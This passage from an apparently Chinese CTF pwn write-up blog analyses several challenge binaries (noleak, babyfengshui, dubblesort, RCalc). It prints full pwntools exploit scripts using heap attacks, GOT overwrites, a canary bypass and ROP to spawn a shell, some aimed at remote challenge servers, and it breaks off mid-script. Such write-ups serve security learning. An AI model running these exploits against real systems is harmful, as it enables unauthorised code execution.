</span><br><span class="line"><span class="comment">#修改商品0的描述，就是修改商品2，这里需要保留商品2的名称、描述大小</span></span><br><span class="line">payload = <span class="string">b&#x27;2&#x27;</span>.ljust(<span class="number">16</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p32(<span class="number">20</span>) + p32(<span class="number">0x20</span>) + p32(atoi_got)  </span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x80</span>,payload)</span><br><span class="line"><span class="comment">#泄露地址</span></span><br><span class="line">show()  </span><br><span class="line">p.recvuntil(<span class="string">&#x27;2: price.20, des.&#x27;</span>)  </span><br><span class="line"><span class="comment"># print(p.recv())</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">atoi_addr = u32(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>).split(<span class="string">b&#x27;\n&#x27;</span>)[<span class="number">0</span>].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))  </span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;atoi&#x27;</span>,atoi_addr)  </span><br><span class="line">libc_base = atoi_addr - libc.dump(<span class="string">&#x27;atoi&#x27;</span>)  </span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)  </span><br><span class="line"><span class="comment">#修改atoi的表，将它指向system  </span></span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x20</span>,p32(system_addr))  </span><br><span class="line">p.sendlineafter(<span class="string">&#x27;your choice&gt;&gt;&#x27;</span>,<span class="string">&#x27;/bin/sh&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">p.interactive()  </span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222182139072.png" alt="image-20201222182139072"></p>
<h2 id="19-noleak"><a href="#19-noleak" class="headerlink" title="19. noleak"></a>19. noleak</h2><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201221093630034.png" alt="image-20201221093630034"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201221093644804.png" alt="image-20201221093644804"></p>
<h3 id="代码分析-13"><a href="#代码分析-13" class="headerlink" title="代码分析"></a>代码分析</h3><p>首先，附件已经提示，<strong>程序是在glibc 2.23下的。</strong></p>
<p>程序是一个自定义的堆管理，实现了添加、删除和更新功能。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222162245601.png" alt="image-20201222162245601"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222162413637.png" alt="image-20201222162413637"></p>
<p>其中漏洞出现再删除和更新上，如图注释所示。由于删除没有置null，存在UAF漏洞，更新存在堆溢出漏洞。</p>
<h3 id="思路及利用-12"><a href="#思路及利用-12" class="headerlink" title="思路及利用"></a>思路及利用</h3><p>由于为<code> Full RELRO</code>，不能更改got表。</p>
<p>整个程序没有输出的选项，也就无法泄露地址（noleak）</p>
<p>而存在UAF漏洞，是可以做到任意地址写的，所以考虑是修改hook函数，将<strong>__malloc_hook</strong>函数修改，这样调用malloc时就会调用 malloc_hook里的指针。</p>
<p>想要修改malloc_hook我们就想到了unsortedbin attack。因为一般来讲，malloc_hook与unsordtedbin相隔不远。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222202509095.png" alt="image-20201222202509095"></p>
<p>程序通过一个在bss段的全局数组管理堆，目标就是通过unsortedbin attack将__malloc_hook的地址写入到这个全局数组上。</p>
<p>为了达成这一目标，首先要是使用unsortedbin attack将unsortedbin的地址写入bss段，然后将最后的俩位从78改为10.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">new(<span class="number">0x80</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">new(<span class="number">0x60</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">new(<span class="number">0x20</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#unsortedbin attack</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">0x601060</span>)</span><br><span class="line">update(<span class="number">0</span>,<span class="number">0x10</span>,payload)</span><br><span class="line">new(<span class="number">0x80</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br></pre></td></tr></table></figure>



<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222205731171.png" alt="image-20201222205731171"></p>
<p>程序并没有开启堆栈不可知性，可以将shellcode写入bss段，然后就是将__malloc_hook里的指针指向写入的shellcoed就可以得到shell。</p>
<p>接下来就是考虑如何修改的问题，由于之前使用了unsortedbin attack，破坏了unsortedbin的结构，因此这里使用fastbinattack，申请chunk即在全局数组，然后通过修改数组的值，借助update函数，将78改为10。</p>
<p>而使用fastbinattack，需要绕过size检查，可以借助写入的7f，这里需要计算一下偏移让伪造的size位为7f。也就是从0x60106d开始。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">update(<span class="number">1</span>, <span class="number">8</span>, p64(<span class="number">0x60106d</span>))</span><br><span class="line">new(<span class="number">0x60</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br></pre></td></tr></table></figure>



<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222211533132.png" alt="image-20201222211533132"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222211642972.png" alt="image-20201222211642972"></p>
<p>然后就是申请0x60大小的chunk，之后我们在数组索引为8，9的位置分别写入了存储泄露出的地址的<code>0x601070</code>和指针数组的开头<code>0x601040</code>，方便我们接下来写入shellcode.</p>
<p><code>new(0x60,b&#39;\x00&#39;*3+p64(0x601070)+p64(0x601040))</code><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222212109392.png" alt="image-20201222212109392"></p>
<p>这样就可以通过修改数组8，改78为10，然后修改数组6（0x601070）为输入的shellcode（数组开端），通过修改数组9，将shellcode写入bss段（从0x601040开始）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">update(<span class="number">8</span>, <span class="number">1</span>, <span class="string">b&#x27;\x10&#x27;</span>)</span><br><span class="line"></span><br><span class="line">update(<span class="number">6</span>, <span class="number">8</span>, p64(<span class="number">0x601040</span>))</span><br><span class="line">update(<span class="number">9</span>, <span class="number">256</span>, asm(shellcraft.amd64.sh()))</span><br></pre></td></tr></table></figure>

<p>最后调用malloc就可以得到shell。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222212557359.png" alt="image-20201222212557359"></p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./timu&quot;</span>)</span><br><span class="line"><span class="comment"># p = remote(&quot;node3.buuoj.cn&quot;,28605)</span></span><br><span class="line"><span class="comment"># p = remote(&quot;220.249.52.134&quot;,58955)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span>(<span class="params">size, data</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice :&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Size&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Data&#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice :&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span>(<span class="params">idx, size, data</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice :&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Size&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Data&#x27;</span>, data)</span><br><span class="line"></span><br><span class="line">new(<span class="number">0x80</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">new(<span class="number">0x60</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">new(<span class="number">0x20</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">0x601060</span>)</span><br><span class="line">update(<span class="number">0</span>,<span class="number">0x10</span>,payload)</span><br><span class="line">new(<span class="number">0x80</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">update(<span class="number">1</span>, <span class="number">8</span>, p64(<span class="number">0x60106d</span>))</span><br><span class="line">new(<span class="number">0x60</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">new(<span class="number">0x60</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">3</span>+p64(<span class="number">0x601070</span>)+p64(<span class="number">0x601040</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">update(<span class="number">8</span>, <span class="number">1</span>, <span class="string">b&#x27;\x10&#x27;</span>)</span><br><span class="line"></span><br><span class="line">update(<span class="number">6</span>, <span class="number">8</span>, p64(<span class="number">0x601040</span>))</span><br><span class="line">update(<span class="number">9</span>, <span class="number">256</span>, asm(shellcraft.amd64.sh()))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice :&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Size&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="20-babyfengshui"><a href="#20-babyfengshui" class="headerlink" title="20. babyfengshui"></a>20. babyfengshui</h2><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222220954444.png" alt="image-20201222220954444"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222221013962.png" alt="image-20201222221013962"></p>
<h3 id="代码分析-14"><a href="#代码分析-14" class="headerlink" title="代码分析"></a>代码分析</h3><p>程序实现了添加新用户、删除、更改等操作。</p>
<p>其结构如图所示：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222222940532.png" alt="image-20201222222940532"></p>
<p>一般来讲，申请的chunk是相邻的。</p>
<p>漏洞出现在更改上。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222221324550.png" alt="image-20201222221324550"></p>
<p>这里是一个检查溢出的判断，可以从结构图就可以看出，这种溢出检验是基于两个chunk是紧邻的。如果一个用户的两个chunk不相邻，且desc在node的前面，就可以做到溢出。</p>
<h3 id="思路及利用-13"><a href="#思路及利用-13" class="headerlink" title="思路及利用"></a>思路及利用</h3><p>接下的问题就是如何将一个用户的两个chunk分开。</p>
<p>先申请三个一样大小（0x80）的用户，删除用户0，unlink会有一个0x100的空闲块，再申请用户3，大小0x100，就将用户3的node与desc分开。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222223555039.png" alt="image-20201222223555039"></p>
<p>然后使用溢出，修改用户1node的description指针为free的got，先泄露地址，再修改为system。最后调用free，得到shell。这里将用户2的description写为“/bin/sh\x00”</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;220.249.52.134&quot;</span>,<span class="number">54735</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./babyfengshui&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,length,text</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Action: &quot;</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;description: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;name: &quot;</span>,<span class="string">&#x27;ffff&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;length: &quot;</span>,<span class="built_in">str</span>(length))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;text: &quot;</span>,text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Action: &quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">display</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Action: &quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">updata</span>(<span class="params">index,length,text</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Action: &quot;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;length: &quot;</span>,<span class="built_in">str</span>(length))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;text: &quot;</span>,text)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x198</span>+p32(elf.got[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line">add(<span class="number">0x100</span>,<span class="number">0x19C</span>,payload)</span><br><span class="line"></span><br><span class="line">display(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;description: &quot;</span>)</span><br><span class="line">free_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;free&quot;</span>,free_addr) </span><br><span class="line">offset = free_addr - libc.dump(<span class="string">&quot;free&quot;</span>) </span><br><span class="line">system_addr = offset + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line"></span><br><span class="line">updata(<span class="number">1</span>,<span class="number">4</span>,p32(system_addr))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222224732060.png" alt="image-20201222224732060"></p>
<h2 id="21-dubblesort"><a href="#21-dubblesort" class="headerlink" title="21. dubblesort"></a>21. dubblesort</h2><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223081129516.png" alt="image-20201223081129516"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223081203985.png" alt="image-20201223081203985"></p>
<h3 id="代码分析-15"><a href="#代码分析-15" class="headerlink" title="代码分析"></a>代码分析</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223082332571.png" alt="image-20201223082332571"></p>
<p>程序的功能是实现一个排序，漏洞主要出现如图所示的两个位置。</p>
<p>没有调用memset对buf清空，里面可能有敏感数据。对输入的整数个数没有上限限制，可以造成栈溢出。</p>
<h3 id="思路及利用-14"><a href="#思路及利用-14" class="headerlink" title="思路及利用"></a>思路及利用</h3><p>首先查看buf里的数据，发现<code>_GLOBAL_OFFSET_TABLE_</code>。可以据此算出libc基址，进而得到system函数地址。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223082737721.png" alt="image-20201223082737721"></p>
<p><code> 0xffffcee0-0xffffcec8=24</code>也就是说，只要输入24个字符，就顺带输出<code>_GLOBAL_OFFSET_TABLE_</code>。</p>
<p>然后考虑栈溢出，canary保护开启，需要泄露或绕过。</p>
<p>显然这个程序中泄露是不可行的，而sacnf的特性能帮助我们绕过canary。</p>
<p>当 scanf 函数接收到不符合格式化字符串的字符时，不会将其放入栈空间中。所以可以在canary处输入<code>+、—</code>等字符绕过canary。</p>
<p><code>_GLOBAL_OFFSET_TABLE_</code>与libc的基址的偏移固定，需要先算出来。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223091146979.png" alt="image-20201223091146979">可以知道v12处是canary。</p>
<p>因此，我们先输入(0x70-0x10)/4 = 24个整数，然后接下来输入+或-号，跳过当前输入，然后我们到达ebp-0xC处，距离返回地址ebp+0x4还差0x10/4=4个，因此，我们继续输入4个整数，接下来，我们再输入ROP即可。</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8  </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line">sh = process(<span class="string">&#x27;./dubblesort&#x27;</span>,env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : <span class="string">&quot;./libc_32.so.6&quot;</span>&#125;)  </span><br><span class="line">sh = remote(<span class="string">&#x27;220.249.52.134&#x27;</span>, <span class="number">49887</span>)  </span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc_32.so.6&#x27;</span>)  </span><br><span class="line">off = <span class="number">0x1AE244</span>  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#泄露地址并计算出libc的地址  </span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x1C</span>  </span><br><span class="line">sh.sendafter(<span class="string">&#x27;name :&#x27;</span>,payload)  </span><br><span class="line">sh.recvuntil(payload)  </span><br><span class="line"><span class="comment">#计算libc加载地址  </span></span><br><span class="line">libc_base = u32(sh.recv(<span class="number">4</span>)) - off  </span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]  </span><br><span class="line">binsh_addr = libc_base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()  </span><br><span class="line">  </span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;libc_base=&#x27;</span>,<span class="built_in">hex</span>(libc_base)  </span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;system_addr=&#x27;</span>,<span class="built_in">hex</span>(system_addr)  </span><br><span class="line">  </span><br><span class="line">n = <span class="number">35</span>  </span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;sort :&#x27;</span>,<span class="built_in">str</span>(n))  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,n<span class="number">-11</span>):  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;number :&#x27;</span>,<span class="built_in">str</span>(<span class="number">0</span>))  </span><br><span class="line">  </span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;number :&#x27;</span>,<span class="string">&#x27;+&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">9</span>):  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;number :&#x27;</span>,<span class="built_in">str</span>(system_addr))  </span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;number :&#x27;</span>,<span class="built_in">str</span>(binsh_addr))  </span><br><span class="line">  </span><br><span class="line">sh.interactive()  </span><br></pre></td></tr></table></figure>

<p>最终结果：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223091348996.png" alt="image-20201223091348996"></p>
<h2 id="22-RCalc"><a href="#22-RCalc" class="headerlink" title="22. RCalc"></a>22. RCalc</h2><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223091552374.png" alt="image-20201223091552374"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223091611277.png" alt="image-20201223091611277"></p>
<h3 id="代码分析-16"><a href="#代码分析-16" class="headerlink" title="代码分析"></a>代码分析</h3><p>整个程序模拟了一个计算器。</p>
<p>程序开始，申请了两个堆，且没有free，结合之后的代码可以知道，一个是0x100的存储数据的堆，一个是0x320的存储自定义的canary的堆。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223093330611.png" alt="image-20201223093330611"></p>
<p>向canary中写入随机数，和读取canary中的值，</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223093513368.png" alt="image-20201223093513368"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223093614793.png" alt="image-20201223093614793"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223093659464.png" alt="image-20201223093659464"></p>
<p>与canary的值不一样说明有溢出，报错。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223093802866.png" alt="image-20201223093802866">这里没有限制输入，是可以做到栈溢出的。</p>
<p>没有对堆上的存储做限制。是可以不断存储数据覆盖canary的。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223094116027.png" alt="image-20201223094116027"></p>
<h3 id="思路及分析"><a href="#思路及分析" class="headerlink" title="思路及分析"></a>思路及分析</h3><p>这道题实际上的思路和常规的有canary的栈溢出题目一样，覆盖或是泄露canary值然后就是常规的栈溢出、rop攻击。</p>
<p>不同的是这里的canary是自定义的，在一个堆中。但是上述分析可以看到，save和canary两个堆是连续申请的且没有free，也就是说这两个堆是连续的，而且并没有对向save堆写入数据有任何限制，是可以做到堆溢出的。</p>
<p>接下来就是计算需要save多少次数据才可以覆盖canary。动态调试，找到save和canary对应的堆。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223094827128.png" alt="image-20201223094827128"></p>
<p>之前差值为<code>（ 0x6033b0-0x6032a0）/8=34</code>，也就是说存储34次就能覆盖掉canary。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setcanary</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">34</span>):</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;input 2 integer: &#x27;</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;Save the result? &#x27;</span>, <span class="string">&#x27;yes&#x27;</span></span><br></pre></td></tr></table></figure>

<p>这样就能将canary覆盖为0，接下来就是栈溢出rop的常规操作。</p>
<p>先泄露地址，得到基地址，找到system。需要一个传参用的gadget，<code>pop rdi ，ret</code></p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223095301158.png" alt="image-20201223095301158"></p>
<p>编写exp：</p>
<p><strong>需要注意的是，libc版本问题</strong>，如果出现如图的情况说明版本不对，地址对不上。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223112047972.png" alt="image-20201223112047972"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span 